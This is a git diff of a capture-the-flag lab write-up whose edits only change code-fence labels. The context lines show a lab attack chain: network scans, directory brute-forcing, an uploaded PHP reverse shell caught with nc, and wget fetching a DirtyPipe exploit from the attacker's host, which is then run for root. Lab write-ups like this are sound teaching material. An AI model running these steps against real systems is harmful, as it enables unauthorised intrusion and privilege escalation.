@@ -22,7 +22,7 @@ _Find the file `flag.txt` and read its content._
 
 First we start by finding the IP of machine here i used the `netdiscover` command.
 
-```Shell
+```shell
 ┌─[aftab@parrot]─[~/Downloads/practice/challenge]
 └──╼ $sudo netdiscover -r 192.168.1.12/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts                 
@@ -43,7 +43,7 @@ we scane the IP `192.168.1.5`,`192.168.1.21` and the IP `192.168.1.21` have web 
 
 I use `rustscan` for port scaning in CTFs because it is insanely fast.
 
-```Shell
+```shell
 ┌─[aftab@parrot]─[~/Downloads/practice/challenge]
 └──╼ $rustscan -a 192.168.1.21
 File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
@@ -58,7 +58,7 @@ opening this website we have nothing but this page:
 
 First though was to look for `robots.txt` file but no luck so i did directory bruteforcing with gobuster.
 
-```Shell
+```shell
 ┌─[aftab@parrot]─[~/Downloads/practice/challenge]
 └──╼ $gobuster dir -u http://192.168.1.21:42710/ -w /usr/share/wordlists/dirb/common.txt 
 ===============================================================
@@ -268,7 +268,7 @@ and path= http://192.168.1.21:42710/assets/uploads/revshell.php
 
 on visiting this file we have reverse shell:
 
-```Shell
+```shell
 ┌─[aftab@parrot]─[~/Downloads/practice/challenge]
 └──╼ $nc -lvnp 8888
 listening on [any] 8888 ...
@@ -303,7 +303,7 @@ reference: [https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits](htt
 
 we follow the steps in GitHub repo and we have `exploit-1`, `exploit-2`. transfer this to victim machine and run.
 
-```Shell
+```shell
 www-data@heathrow-VirtualBox:/tmp$ wget 192.168.1.12/exploit-2
 wget 192.168.1.12/exploit-2
 --2022-12-22 00:04:11--  http://192.168.1.12/exploit-2
@@ -317,7 +317,7 @@ Saving to: 'exploit-2'
 2022-12-22 00:04:11 (395 KB/s) - 'exploit-2' saved [21480/21480]
 ```
 
-```Shell
+```shell
 www-data@heathrow-VirtualBox:/tmp$ ./exploit-2 /usr/bin/sudo
 ./exploit-2 /usr/bin/sudo
 id
@@ -331,7 +331,7 @@ flag{box_cracked_successfully_report_to_admin}challenge
 ---
 
 flag: 
-```Shell
+```shell
 flag{box_cracked_successfully_report_to_admin}challenge 
 ```
 
